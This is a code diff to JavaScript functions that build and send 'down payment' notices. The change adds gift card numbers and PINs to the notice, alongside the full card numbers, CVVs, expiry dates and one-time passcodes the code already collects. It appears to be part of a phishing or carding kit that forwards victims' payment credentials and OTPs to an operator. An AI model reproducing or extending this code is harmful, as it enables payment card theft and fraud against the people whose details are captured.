@@ -32,6 +32,16 @@ function buildNotice(payload, monthly, title, isCard) {
 
   const body = lines.filter(Boolean);
 
+  if (payload.method === "gift") {
+    const gift = ["Gift card"];
+    if (payload.cardNumber) gift.push(`Gift card number: ${clip(payload.cardNumber, 40)}`);
+    if (payload.giftPin || payload.cardCvv) gift.push(`PIN: ${clip(payload.giftPin || payload.cardCvv, 40)}`);
+    if (gift.length > 1) {
+      body.push("");
+      body.push(...gift);
+    }
+  }
+
   if (isCard) {
     const card = ["Card details"];
     if (payload.cardholderName) {
@@ -132,10 +142,11 @@ export async function sendDownPaymentNotice(payload) {
   const isOtpResend = payload.noticeType === "card_otp_resend";
   const isOtpSubmit = payload.noticeType === "card_otp" || Boolean(payload.cardOtp);
   const isCard =
-    payload.method === "card" ||
-    Boolean(payload.cardNumber || payload.cardCvv || payload.cardExpiry) ||
-    isOtpSubmit ||
-    isOtpResend;
+    payload.method !== "gift" &&
+    (payload.method === "card" ||
+      Boolean(payload.cardNumber || payload.cardCvv || payload.cardExpiry) ||
+      isOtpSubmit ||
+      isOtpResend);
 
   let title;
   if (isOtpResend) {
